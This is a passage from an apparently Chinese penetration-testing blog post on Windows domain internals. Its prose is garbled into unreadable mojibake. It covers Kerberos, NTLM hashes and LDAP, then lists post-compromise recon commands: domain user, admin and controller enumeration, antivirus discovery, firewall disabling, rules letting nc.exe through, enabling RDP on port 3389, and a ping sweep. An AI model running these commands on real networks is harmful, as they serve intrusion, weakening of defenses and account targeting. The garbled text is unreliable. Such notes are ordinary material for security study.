­ï¼ŒClientå’ŒServerä¸ºåŸŸå†…çš„ç”¨æˆ·æˆ–è€…æœåŠ¡</p></blockquote><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210722100209527.png" alt="image-20210722100209527"></p><p>è®¤è¯æµç¨‹ï¼ˆèº«ä»½è®¤è¯æœåŠ¡äº¤æ¢ï¼Œç¥¨æ®æˆæƒæœåŠ¡äº¤æ¢ï¼Œå®¢æˆ·ç«¯/æœåŠ¡è®¤è¯äº¤æ¢ï¼‰</p><ol><li><p>Clientå…ˆå‘KDCå‘èµ·è¯·æ±‚ï¼Œè¯·æ±‚çš„å‡­æ®å°±æ˜¯Client hashåŠ å¯†çš„æ—¶é—´æˆ³</p></li><li><p>KDCä½¿ç”¨Client hashè§£å¯†ï¼Œå¦‚æœæ­£ç¡®å°±è¿”å›è§£å¯†çš„TGTï¼ŒTGTä¸­åŒ…å«äº†PACï¼ŒPACä¸­åŒ…å«äº†Clientçš„sidï¼ŒClientæ‰€åœ¨çš„ç»„</p><blockquote><p>PAC(Privilege Attribute Certificate)ç‰¹æƒå±æ€§è¯ä¹¦ï¼Œä¸åŒè´¦æˆ·æœ‰ä¸åŒçš„æƒé™ï¼ŒPACå°±æ˜¯ç”¨æ¥åŒºåˆ†ä¸åŒæƒé™çš„</p></blockquote></li><li><p>Clientå‡­å€ŸTGTç¥¨æ®å‘KDCå‘èµ·é’ˆå¯¹ç‰¹å®šæœåŠ¡çš„è¯·æ±‚</p></li><li><p>KDCè§£å¯†ï¼Œå¦‚æœæ­£ç¡®å°±è¿”å›åŠ å¯†çš„TGSï¼ˆä¸ç®¡ç”¨æˆ·æœ‰æ²¡æœ‰è®¿é—®æƒé™ï¼ŒTGTæ­£ç¡®å°±ä¼šè¿”å›TGSç¥¨æ®ï¼‰</p></li><li><p>Clientæ‹¿ç€TGSç¥¨æ®å»è¯·æ±‚æœåŠ¡</p></li><li><p>Serverè§£å¯†TGSï¼ŒéªŒè¯èº«ä»½</p></li></ol></li></ul><p>ç›¸å…³æ¼æ´ï¼šMS14-068åˆ©ç”¨kerberosæ¼æ´è·å–åˆ°åŸŸæ§æƒé™ï¼Œé»„é‡‘ç¥¨æ®ï¼Œç™½é“¶ç¥¨æ®</p><h5 id="NTLM"><a href="#NTLM" class="headerlink" title="NTLM"></a>NTLM</h5><p>Windowså†…éƒ¨åªä¿å­˜äº†å¯†ç çš„hashï¼Œå¹¶ä¸ä¿å­˜æ˜æ–‡å¯†ç ï¼Œæœ¬æœºç”¨æˆ·çš„hashä¿å­˜åœ¨æœ¬åœ°çš„<strong>SAMæ–‡ä»¶</strong>ä¸­ï¼Œå½“æˆ‘ä»¬ç™»å½•ç³»ç»Ÿæ—¶ï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨è¯»å–SAMæ–‡ä»¶ä¸­çš„å¯†ç ä¸æˆ‘ä»¬è¾“å…¥çš„å¯†ç å¯¹æ¯”ï¼Œæ˜¯å¦ç›¸åŒï¼›åŸŸå†…ç”¨æˆ·çš„hashä¿å­˜åœ¨åŸŸæ§çš„<strong>NTDS.dit</strong>æ–‡ä»¶ä¸­</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210722110852458.png" alt="image-20210722110852458"></p><ul><li>NTLM Hash æ˜¯æ”¯æŒNet NTLMè®¤è¯åè®®åŠæœ¬åœ°è®¤è¯è¿‡ç¨‹ä¸­çš„ä¸€ä¸ªé‡è¦å‚ä¸ç‰©ï¼Œå…¶é•¿åº¦ä¸º32ä½ï¼Œç”±æ•°å­—ä¸å­—æ¯ç»„æˆ</li><li><strong>Windowsæœ¬èº«ä¸å­˜å‚¨ç”¨æˆ·çš„æ˜æ–‡å¯†ç </strong>ï¼Œå®ƒä¼šå°†ç”¨æˆ·çš„æ˜æ–‡å¯†ç ç»è¿‡åŠ å¯†ç®—æ³•åå­˜å‚¨åœ¨SAMæ•°æ®åº“ä¸­</li><li>å½“ç”¨æˆ·ç™»å½•çš„æ—¶å€™ï¼Œå°†ç”¨æˆ·è¾“å…¥çš„æ˜æ–‡å¯†ç ä¹ŸåŠ å¯†æˆNTLM Hashï¼Œä¸SAMæ•°æ®åº“ä¸­çš„NTLM Hashè¿›è¡Œæ¯”è¾ƒ</li></ul><p>LM Hashæ˜¯windowsæ—©æœŸç”¨çš„åŠ å¯†ç®—æ³•ï¼Œä¸ºäº†è§£å†³LMåŠ å¯†å’Œèº«ä»½éªŒè¯ä¸­çš„å›ºæœ‰çš„å®‰å…¨å¼±ç‚¹ï¼Œæœ‰äº†NTLMåè®®ï¼Œä»Windows7 å’Œ windows server 2008å¼€å§‹ï¼Œç³»ç»Ÿé»˜è®¤åªä¼šå­˜å‚¨NTLM Hashã€‚</p><p>NTLM Hashçš„äº§ç”Ÿè¿‡ç¨‹</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210804094211071.png" alt="image-20210804094211071"></p><p>æœ¬åœ°è®¤è¯æµç¨‹</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210804095544847.png" alt="image-20210804095544847"></p><p>NTLMåè®®åŒ…æ‹¬äº†NTLMv1å’ŒNTLMv2ä¸¤ä¸ªç‰ˆæœ¬ï¼ŒNTLMéªŒè¯æ˜¯ä¸€ç§Challenge/Reaponse éªŒè¯æœºåˆ¶ï¼Œç”±ä¸‰ç§æ¶ˆæ¯ç»„æˆï¼š</p><ol><li>åå•†ï¼šç¡®è®¤åŒæ–¹ç‰ˆæœ¬</li><li>è´¨è¯¢ï¼šæ˜¯Challenge / Response è®¤è¯æœºåˆ¶èµ·ä½œç”¨çš„èŒƒç•´</li><li>éªŒè¯ï¼šå®Œæˆè´¨è¯¢åï¼ŒéªŒè¯ç»“æœ</li></ol><p>è´¨è¯¢æµç¨‹ï¼š</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210804103007109.png" alt="image-20210804103007109"></p><ol><li>å®¢æˆ·ç«¯å‘æœåŠ¡å™¨ç«¯å‘é€ç”¨æˆ·ä¿¡æ¯ï¼ˆç”¨æˆ·åï¼‰è¯·æ±‚</li><li>æœåŠ¡å™¨æ¥æœåˆ°è¯·æ±‚ï¼Œåˆ¤æ–­æœ¬åœ°è´¦æˆ·åˆ—è¡¨ä¸­æ˜¯å¦æœ‰å¯¹åº”çš„è€Œç”¨æˆ·åï¼Œå¦‚æœæœ‰å°±ç”Ÿæˆä¸€ä¸ªChallengeï¼Œä½¿ç”¨ç™»å½•ç”¨æˆ·åå¯¹åº”çš„NTLM HashåŠ å¯†Challengeï¼Œç”Ÿæˆä¸€ä¸ª<strong>Net-NTLM Hashå­˜åœ¨äºå†…å­˜</strong>ä¸­ï¼Œç”Ÿæˆåå°†Challengeå‘é€ç»™å®¢æˆ·ç«¯ï¼ˆNTLMv1çš„Challengeæ˜¯8ä½ï¼ŒNTLMv2çš„Challengeæ˜¯16ä½ï¼‰</li><li>å®¢æˆ·ç«¯æ¥æœåˆ°Challengeåä½¿ç”¨å°†è¦æ‰½ç‰¢å›ºåˆ°è´¦æˆ·å¯¹åº”çš„NTLM HashåŠ å¯†Challengeç”ŸæˆReaponseï¼Œç„¶åå°†Responseå‘é€åˆ°æœåŠ¡ç«¯</li></ol><p>éªŒè¯ï¼šæœåŠ¡ç«¯æ”¶åˆ°å®¢æˆ·ç«¯çš„Responseåå¯¹æ¯”Net-NTLM Hash å’ŒResponseæ˜¯å¦ç›¸åŒã€‚</p><p>ç›¸å…³æ¼æ´ï¼šHashä¼ é€’æ”»å‡»ï¼ˆPTHï¼‰</p><p>å‚è€ƒæ–‡ç« </p><p><a href="https://www.cnblogs.com/-qing-/p/11343859.html">https://www.cnblogs.com/-qing-/p/11343859.html</a></p><p><a href="https://websec.readthedocs.io/zh/latest/auth/ntlm.html">https://websec.readthedocs.io/zh/latest/auth/ntlm.html</a></p><h5 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h5><p>Active Directoryï¼ˆæ´»åŠ¨ç›®å½•ï¼‰</p><ol><li><p>æ¦‚å¿µ</p><ul><li><p>Active Directory å­˜å‚¨äº†æœ‰å…³ç½‘ç»œå¯¹è±¡çš„ä¿¡æ¯ï¼Œå¹¶ä¸”è®©ç®¡ç†å‘˜å’Œç”¨æˆ·èƒ½å¤Ÿè½»æ¾åœ°æŸ¥æ‰¾å’Œä½¿ç”¨è¿™äº›ä¿¡æ¯ã€‚å®ƒä½¿ç”¨äº†ä¸€ç§ç»“æ„åŒ–çš„æ•°æ®å­˜å‚¨æ–¹æ³•ï¼Œå¹¶ä¸”ä»¥æ­¤ä¸ºåŸºç¡€å¯¹ç›®å½•ä¿¡æ¯è¿›è¡Œå‘µæŠ¤é€»è¾‘çš„åˆ†å±‚ç»„ç»‡ã€‚</p><blockquote><p>ç½‘ç»œå¯¹è±¡ï¼šç”¨æˆ·ï¼Œç”¨æˆ·ç»„ï¼Œè®¡ç®—æœºï¼ŒåŸŸï¼Œç»„ç»‡å•ä½ä»¥åŠå®‰å…¨ç­–ç•¥ç­‰</p></blockquote></li></ul></li><li><p>æ´»åŠ¨ç›®å½•çš„åŠŸèƒ½</p><ul><li>æœåŠ¡å™¨ä»¥åŠå®¢æˆ·ç«¯è®¡ç®—æœºç®¡ç†ï¼šç®¡ç†æœåŠ¡å™¨åŠå®¢æˆ·ç«¯è®¡ç®—æœºè´¦æˆ·ï¼Œæ‰€æœ‰æœåŠ¡å™¨åŠå®¢æˆ·ç«¯è®¡ç®—æœºåŠ å…¥åŸŸç®¡ç†å¹¶å®æ–½ç»„ç­–ç•¥</li><li>ç”¨æˆ·æœåŠ¡ï¼šç®¡ç†ç”¨æˆ·åŸŸè´¦æˆ·ï¼Œç”¨æˆ·ä¿¡æ¯ï¼Œä¼ä¸šé€šè®¯å½•ï¼Œç”¨æˆ·ç»„ç®¡ç†ï¼Œç”¨æˆ·èº«ä»½è®¤è¯ï¼Œç”¨æˆ·æˆæƒç®¡ç†ç­‰</li><li>èµ„æºç®¡ç†ï¼šç®¡ç†æ‰“å°æœºï¼Œæ–‡ä»¶å…±äº«æœåŠ¡ç­‰ç½‘ç»œèµ„æº</li><li>æ¡Œé¢é…ç½®ï¼šç³»ç»Ÿç®¡ç†å‘˜å¯ä»¥é›†ä¸­çš„é…ç½®å„ç§æ¡Œé¢é…ç½®ç­–ç•¥</li><li>åº”ç”¨ç³»ç»Ÿæ”¯æ’‘</li></ul></li></ol><p><a href="https://www.geekby.site/2020/12/ldap-%E5%8D%8F%E8%AE%AE/">https://www.geekby.site/2020/12/ldap-%E5%8D%8F%E8%AE%AE/</a></p><p><a href="https://zhuanlan.zhihu.com/p/147768058">https://zhuanlan.zhihu.com/p/147768058</a></p><p>LDAPï¼ˆè½»é‡ç›®å½•è®¿é—®åè®®ï¼‰ï¼šçº¦å®šäº†Clientä¸Serverä¹‹é—´çš„ä¿¡æ¯äº¤äº’æ ¼å¼ï¼Œä½¿ç”¨ç«¯å£å·ï¼Œè®¤è¯æ–¹å¼ç­‰å†…å®¹ã€‚å¾®è½¯çš„<code>Active Directory</code>å°±æ˜¯ä¾é LDAPå®ç°çš„ï¼ŒAD å®ç°äº† LDAP æ‰€éœ€çš„æ ‘å½¢æ•°æ®åº“ã€å…·ä½“å¦‚ä½•è§£æè¯·æ±‚æ•°æ®å¹¶åˆ°æ•°æ®åº“æŸ¥è¯¢ç„¶åè¿”å›ç»“æœç­‰åŠŸèƒ½ã€‚<code>OpenLDAP</code> æ˜¯å¯ä»¥è¿è¡Œåœ¨ Linux ä¸Šçš„ LDAP åè®®çš„å¼€æºå®ç°ã€‚å¹³å¸¸è¯´çš„ LDAP Serverï¼Œä¸€èˆ¬æŒ‡çš„æ˜¯å®‰è£…å¹¶é…ç½®äº† <code>Active Directory</code>ã€<code>OpenLDAP</code> è¿™äº›ç¨‹åºçš„æœåŠ¡å™¨ã€‚</p><p>LDAP çš„ç›®å½•æ ‘æ¦‚å¿µ:</p><ol><li><p>ç›®å½•æ ‘ï¼šåœ¨ä¸€ä¸ªç›®å½•æœåŠ¡ç³»ç»Ÿä¸­ï¼Œæ•´ä¸ªç›®å½•ä¿¡æ¯é›†å¯ä»¥è¡¨ç¤ºä¸ºä¸€ä¸ªç›®å½•ä¿¡æ¯æ ‘ï¼Œæ ‘ä¸­çš„æ¯ä¸ªèŠ‚ç‚¹æ˜¯ ä¸€ä¸ªæ¡ç›®ã€‚</p></li><li><p>æ¡ç›®ï¼šæ¯ä¸ªæ¡ç›®å°±æ˜¯ä¸€æ¡è®°å½•ï¼Œæ¯ä¸ªæ¡ç›®æœ‰è‡ªå·±çš„å”¯ä¸€å¯åŒºåˆ«çš„åç§°(DN)ã€‚</p></li><li><p>å¯¹è±¡ç±»ï¼šobjectClassï¼Œä¸æŸä¸ªå®ä½“ç±»å‹å¯¹åº”çš„ä¸€ç»„å±æ€§ï¼Œå¯¹è±¡ç±»æ˜¯å¯ä»¥ç»§æ‰¿çš„ï¼Œè¿™æ ·çˆ¶ç±»çš„å¿…é¡»å±</p><p>æ€§ä¹Ÿä¼šè¢«ç»§æ‰¿ä¸‹æ¥ã€‚</p></li><li><p>å±æ€§ï¼šæè¿°æ¡ç›®çš„æŸä¸ªæ–¹é¢çš„ä¿¡æ¯ï¼Œä¸€ä¸ªå±æ€§ç”±ä¸€ä¸ªå±æ€§ç±»å‹å’Œä¸€ä¸ªæˆ–å¤šä¸ªå±æ€§å€¼ç»„æˆï¼Œå±æ€§æœ‰å¿…é¡»å±æ€§å’Œéå¿…é¡»å±æ€§ã€‚</p></li></ol><h4 id="å·¥ä½œç»„-åŸŸä¿¡æ¯æ”¶é›†"><a href="#å·¥ä½œç»„-åŸŸä¿¡æ¯æ”¶é›†" class="headerlink" title="å·¥ä½œç»„/åŸŸä¿¡æ¯æ”¶é›†"></a>å·¥ä½œç»„/åŸŸä¿¡æ¯æ”¶é›†</h4><h5 id="æœ¬æœºä¿¡æ¯æ”¶é›†"><a href="#æœ¬æœºä¿¡æ¯æ”¶é›†" class="headerlink" title="æœ¬æœºä¿¡æ¯æ”¶é›†"></a>æœ¬æœºä¿¡æ¯æ”¶é›†</h5><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs routeros">whoami <span class="hljs-built_in">/user </span>æŸ¥çœ‹å½“å‰ç”¨æˆ·<br>whoami /priv æŸ¥çœ‹å½“å‰ç”¨æˆ·æƒé™<br>ipconfig /all æŸ¥çœ‹ç½‘ç»œé…ç½®<br>nestat -ano  æŸ¥çœ‹ç«¯å£åˆ—è¡¨<br>systeminfo æŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯<br>net share æŸ¥çœ‹æœ¬æœºå…±äº«<br>cmdkey /l è¿œç¨‹æ¡Œé¢è¿æ¥å†å²è®°å½•<br>net<span class="hljs-built_in"> user </span>æŸ¥çœ‹æœ¬æœºä¸Šçš„ç”¨æˆ·åˆ—è¡¨<br>net<span class="hljs-built_in"> user </span>name æŸ¥çœ‹æœ¬æœºç”¨æˆ·å…·ä½“ä¿¡æ¯<br>net localgroup administrators è·å–æœ¬åœ°ç®¡ç†å‘˜ï¼ˆé€šå¸¸åŒ…å«åŸŸç”¨æˆ·ï¼‰ä¿¡æ¯<br>query<span class="hljs-built_in"> user </span>|| qwinsta æŸ¥çœ‹å½“å‰åœ¨çº¿ç”¨æˆ·<br>route <span class="hljs-builtin-name">print</span> æŸ¥çœ‹è·¯ç”±è¡¨ç¼“å­˜<br>arp -a è·¯ç”±ç¼“å­˜<br><br>wmic OS <span class="hljs-builtin-name">get</span> Caption,CSDVersion,OSArchitecture,Version æŸ¥çœ‹æ“ä½œç³»ç»Ÿï¼ˆåŸºæœ¬systeminfoé‡Œé¢éƒ½æœ‰ï¼‰<br>wmic product <span class="hljs-builtin-name">get</span> name,version æŸ¥çœ‹å½“å‰å®‰è£…çš„ç¨‹åº<br>wmic<span class="hljs-built_in"> service </span>list brief æŸ¥è¯¢æœ¬æœºæœåŠ¡ä¿¡æ¯<br>wmic process list brief æŸ¥è¯¢è¿›ç¨‹åˆ—è¡¨<br>tasklist /v æŸ¥è¯¢è¿›ç¨‹åˆ—è¡¨<br>wmic /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct <span class="hljs-builtin-name">Get</span> displayName /Format:list æŸ¥æ€è½¯<br><br>é˜²ç«å¢™ç›¸å…³ï¼š<br>å…³é—­é˜²ç«å¢™ï¼š<br>windows<span class="hljs-built_in"> server </span>2003åŠä»¥å‰ï¼šnetsh<span class="hljs-built_in"> firewall </span><span class="hljs-builtin-name">set</span> opmode disable<br>windows<span class="hljs-built_in"> server </span>2003ä»¥åï¼šnetsh advfirewall <span class="hljs-builtin-name">set</span> allprofiles state off<br>æŸ¥çœ‹é˜²ç«å¢™é…ç½®ï¼šnetsh<span class="hljs-built_in"> firewall </span>show config<br>ä¿®æ”¹é˜²ç«å¢™é…ç½®ï¼š<br>windows<span class="hljs-built_in"> server </span>2003åŠä»¥å‰å…è®¸æŒ‡å®šç¨‹åºå…¨éƒ¨è¿æ¥ï¼šnetsh<span class="hljs-built_in"> firewall </span><span class="hljs-builtin-name">add</span> allowedprogram c:\nc.exe <span class="hljs-string">&quot;allow nc&quot;</span> enable<br>windows<span class="hljs-built_in"> server </span>2003ä»¥åç‰ˆæœ¬ï¼š<br>å…è®¸æŒ‡å®šç¨‹åºæ¥å…¥ï¼šnetsh advfirewall<span class="hljs-built_in"> firewall </span><span class="hljs-builtin-name">add</span> rule <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;pass nc&quot;</span> <span class="hljs-attribute">dir</span>=in <span class="hljs-attribute">action</span>=allow <span class="hljs-attribute">program</span>=<span class="hljs-string">&quot;C:\nc.exe&quot;</span><br>å…è®¸æŒ‡å®šç¨‹åºé€€å‡ºï¼šnetsh advfirewall<span class="hljs-built_in"> firewall </span><span class="hljs-builtin-name">add</span> rule <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Allow nc&quot;</span> <span class="hljs-attribute">dir</span>=out <span class="hljs-attribute">action</span>=allow <span class="hljs-attribute">program</span>=<span class="hljs-string">&quot;c:\nc.exe&quot;</span><br>å…è®¸3389ç«¯å£å¼€æ”¾ï¼šnetsh advfirewall<span class="hljs-built_in"> firewall </span><span class="hljs-builtin-name">add</span> rule <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Remote Desktop&quot;</span> <span class="hljs-attribute">protocol</span>=TCP <span class="hljs-attribute">dir</span>=in <span class="hljs-attribute">localport</span>=3389 <span class="hljs-attribute">action</span>=allow<br>è‡ªå®šä¹‰é˜²ç«å¢™æ—¥å¿—çš„å­˜å‚¨ä½ç½®ï¼šnetsh advfirewall <span class="hljs-builtin-name">set</span> currentprofile<span class="hljs-built_in"> logging </span>filename <span class="hljs-string">&quot;c:\windows\temp\fw.log&quot;</span><br><br>æŸ¥çœ‹ä»£ç†ï¼šreg query <span class="hljs-string">&quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot;</span><br><br>æŸ¥çœ‹è¿œç¨‹æœåŠ¡è¿æ¥ç«¯å£ï¼šREG QUERY <span class="hljs-string">&quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot;</span> /V PortNumber<br><br>Windows<span class="hljs-built_in"> Server </span>2003ä¸­å¼€å¯3389ï¼šwmic path win32_terminalservicesetting where (__CLASS!=<span class="hljs-string">&quot;&quot;</span>) <br>call setallowtsconnections 1<br><br>windows<span class="hljs-built_in"> Server </span>2008å’Œ2012ä¸­å¼€å¯3389ï¼š<br>1. wmic /namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS!=<span class="hljs-string">&quot;&quot;</span>) call setallowtsconnections 1<br>2. wmic /namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where (<span class="hljs-attribute">TerminialNAme</span>=<span class="hljs-string">&#x27;RDP-Tcp&#x27;</span>) call setuserauthenticationrequired 1<br>3. reg <span class="hljs-builtin-name">add</span> <span class="hljs-string">&quot;HKLM\SYSTEM\CURRENT\CONTROLSET\CONTROL\TERMINAL SERVER&quot;</span> /v fSingleSessionPerUSer /t REG_DWORD /d 0 /f<br></code></pre></td></tr></table></figure><h5 id="å·¥ä½œç»„"><a href="#å·¥ä½œç»„" class="headerlink" title="å·¥ä½œç»„"></a>å·¥ä½œç»„</h5><blockquote><p>å·¥ä½œç»„çš„ä¿¡æ¯æ”¶é›†æ„Ÿè§‰å’Œä¸Šé¢å·®ä¸å¤šï¼Œå¹³æ—¶æ²¡æ€ä¹ˆé‡åˆ°è¿‡</p></blockquote><h5 id="åŸŸ"><a href="#åŸŸ" class="headerlink" title="åŸŸ"></a>åŸŸ</h5><p>å½“å†…ç½‘ä¸­å­˜åœ¨åŸŸï¼Œé‚£ä¹ˆ<strong>æœ¬åœ°çš„æ™®é€šç”¨æˆ·</strong>åªèƒ½æŸ¥è¯¢åˆ°<strong>æœ¬æœºçš„ç›¸å…³ä¿¡æ¯</strong>ä¸èƒ½æŸ¥è¯¢åˆ°åŸŸå†…ä¿¡æ¯ï¼Œæœ¬åœ°ç®¡ç†å‘˜ç”¨æˆ·å’ŒåŸŸå†…ç”¨æˆ·å¯ä»¥æŸ¥è¯¢åŸŸå†…ä¿¡æ¯ã€‚åŸç†æ˜¯ï¼šåŸŸå†…çš„æ‰€æœ‰æŸ¥è¯¢éƒ½æ˜¯é€šè¿‡åŸŸæ§åˆ¶å™¨å®ç°çš„ï¼ˆåŸºäºLDAPåè®®ï¼‰ï¼Œè€Œè¿™ä¸ª<strong>æŸ¥è¯¢éœ€è¦æƒé™</strong>è®¤è¯ï¼Œæ‰€ä»¥åªæœ‰åŸŸç”¨æˆ·æ‰æ‹¥æœ‰è¿™ä¸ªæƒé™ï¼›åŸŸç”¨æˆ·æ‰§è¡ŒæŸ¥è¯¢å‘½ä»¤æ—¶ï¼Œä¼šè‡ªåŠ¨ä½¿ç”¨kerberosåè®®è®¤è¯ï¼Œæ— éœ€è¾“å…¥é¢å¤–çš„è´¦æˆ·å¯†ç ã€‚</p><p>æœ¬åœ°ç®¡ç†å‘˜Administratoræƒé™å¯ä»¥ç›´æ¥æå‡ä¸ºNtauthorityæˆ–è€…systemæƒé™ï¼Œåœ¨åŸŸä¸­é™¤äº†æ™®é€šç”¨æˆ·ä»¥å¤–ï¼Œæ‰€æœ‰æœºå™¨éƒ½æœ‰ä¸€ä¸ªæœºå™¨ç”¨æˆ·ï¼ˆç”¨æˆ·åæ˜¯æœºå™¨ååŠ ä¸Š$ï¼‰ï¼Œæœ¬è´¨ä¸Š<strong>æœºå™¨çš„systemç”¨æˆ·å¯¹åº”çš„å°±æ˜¯åŸŸå†…çš„æœºå™¨ç”¨æˆ·</strong>ï¼Œæ‰€ä»¥ä½¿ç”¨systemæƒé™å¯ä»¥è¿è¡ŒåŸŸå†…çš„æŸ¥è¯¢å‘½ä»¤</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs routeros">åˆ¤æ–­æ˜¯å¦æœ‰åŸŸï¼š<br>systeminfo<br>ipconfig /all æŸ¥çœ‹ç½‘å…³IPï¼ŒDNSçš„IPï¼ŒåŸŸåï¼Œæœ¬æœºæ˜¯å¦å’ŒDNSæœåŠ¡å™¨å¤„äºåŒä¸€ç½‘æ®µï¼Œç„¶åä½¿ç”¨nslookupè§£æåŸŸåçš„IPï¼Œåˆ¤æ–­åŸŸæ§å’ŒDNSæ˜¯å¦åœ¨åŒä¸€æœåŠ¡å™¨<br><br>whoami /all  è·å–åŸŸSID<br>net<span class="hljs-built_in"> config </span>workstation æŸ¥çœ‹å½“å‰ç™»å½•åŸŸ<br>net time /domain åˆ¤æ–­ä¸»åŸŸï¼ˆåŸŸæœåŠ¡å™¨é€šå¸¸ä½œä¸ºæ—¶é—´æœåŠ¡å™¨ä½¿ç”¨ï¼‰<br><br>net<span class="hljs-built_in"> user </span>/domain è·å¾—æ‰€æœ‰åŸŸç”¨æˆ·åˆ—è¡¨<br>net<span class="hljs-built_in"> user </span>xxx /domain æŸ¥è¯¢æŒ‡å®šç”¨æˆ·è¯¦ç»†ä¿¡æ¯<br>wmic useraccount <span class="hljs-builtin-name">get</span> /all è·å–åŸŸå†…ç”¨æˆ·è¯¦ç»†ä¿¡æ¯<br>dsquery<span class="hljs-built_in"> user </span>æŸ¥çœ‹å­˜åœ¨çš„ç”¨æˆ·<br><br>net view /domain æŸ¥è¯¢åŸŸ<br>net view /domain:domain_name æŸ¥è¯¢åŸŸå†…æ‰€æœ‰è®¡ç®—æœº<br><br>net<span class="hljs-built_in"> group </span>/domain è·å¾—æ‰€æœ‰åŸŸç”¨æˆ·ç»„åˆ—è¡¨<br>net<span class="hljs-built_in"> group </span><span class="hljs-string">&quot;domain computers&quot;</span> /domain æŸ¥è¯¢åŸŸæˆå‘˜è®¡ç®—æœº<br>net<span class="hljs-built_in"> group </span><span class="hljs-string">&quot;Domain Controllers&quot;</span> /domain æŸ¥çœ‹åŸŸæ§åˆ¶å™¨ç»„ï¼ˆä¸€ä¸ªåŸŸå†…ä¸€èˆ¬å­˜åœ¨ä¸¤å°æˆ–è€…ä¸¤å°ä»¥ä¸Šçš„åŸŸæ§åˆ¶å™¨ï¼Œé˜²ç¾ï¼‰<br>net<span class="hljs-built_in"> group </span><span class="hljs-string">&quot;domain admins&quot;</span> /domain è·å¾—åŸŸç®¡ç†å‘˜åˆ—è¡¨<br>net<span class="hljs-built_in"> group </span><span class="hljs-string">&quot;Enterprise Admins&quot;</span> /domain æŸ¥è¯¢ç®¡ç†å‘˜ç”¨æˆ·ç»„<br>net localgroup administrators è·å–æœ¬åœ°ç®¡ç†å‘˜ï¼ˆé€šå¸¸åŒ…å«åŸŸç”¨æˆ·ï¼‰ä¿¡æ¯<br><br>net accounts /domain è·å–åŸŸå¯†ç ä¿¡æ¯<br>nltest /domain_trusts è·å–åŸŸä¿¡ä»»ä¿¡æ¯<br><br>nltest /DCLIST:domain_name æŸ¥çœ‹åŸŸæ§æœºå™¨å<br>netdom query pdc æŸ¥çœ‹åŸŸæ§æœºå™¨å<br>Nslookup <span class="hljs-attribute">-type</span>=SRV _ldap._tcp æŸ¥çœ‹åŸŸæ§åˆ¶å™¨ä¸»æœºå<br><br>tasklist /v åˆ—å‡ºæœ¬æœºè¿›ç¨‹å’Œè¿›ç¨‹ç”¨æˆ·ï¼ˆéœ€è¦æ³¨æ„æ˜¯å¦æœ‰åŸŸç®¡ç†å‘˜çš„è¿›ç¨‹ï¼‰<br></code></pre></td></tr></table></figure><p><strong>æ¢æµ‹åŸŸå†…å­˜æ´»ä¸»æœº</strong></p><ol><li><code>nbtscan</code>ï¼šä¸‹è½½ï¼š<a href="http://unixwiz.net/tools/nbtscan.html">http://unixwiz.net/tools/nbtscan.html</a> ä¼ å…¥é¶æœºæ‰§è¡Œ<code>nbt.exe ipæ®µ</code> å³å¯</li><li>åˆ©ç”¨ICMPåè®®æ¢æµ‹ï¼š<code>for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.1.%I | findstr &quot;TTL=&quot;</code></li><li>ARPæ‰«æå†…ç½‘ï¼šwindowsç‰ˆ <a href="https://github.com/QbsuranAlang/arp-scan-windows-">https://github.com/QbsuranAlang/arp-scan-windows-</a> å…¶ä»–ç‰ˆæœ¬<a href="https://github.com/royhills/arp-scan">https://github.com/royhills/arp-scan</a> </li><li>Empireä¸­çš„arpscanæ¨¡å—ï¼Œè¾“å…¥<code>unamemodule 